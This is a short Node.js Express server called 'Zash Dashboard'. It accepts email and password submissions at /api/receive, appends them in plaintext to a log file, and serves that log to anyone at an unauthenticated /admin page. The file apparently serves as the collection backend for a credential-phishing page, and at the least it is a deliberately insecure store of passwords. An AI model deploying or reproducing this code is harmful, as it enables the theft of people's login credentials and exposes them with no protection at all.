const express = require("express");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

app.post("/api/receive", (req, res) => {
  const { email, password, timestamp } = req.body;
  const log = `[${timestamp}] Email: ${email} | Password: ${password}\n`;
  fs.appendFileSync("logs.txt", log);
  res.json({ status: "received" });
});

app.get("/admin", (req, res) => {
  const logs = fs.readFileSync("logs.txt", "utf-8");
  res.setHeader("Content-Type", "text/plain");
  res.send(logs);
});

app.listen(PORT, () => {
  console.log("Zash Dashboard running on http://localhost:" + PORT);
});
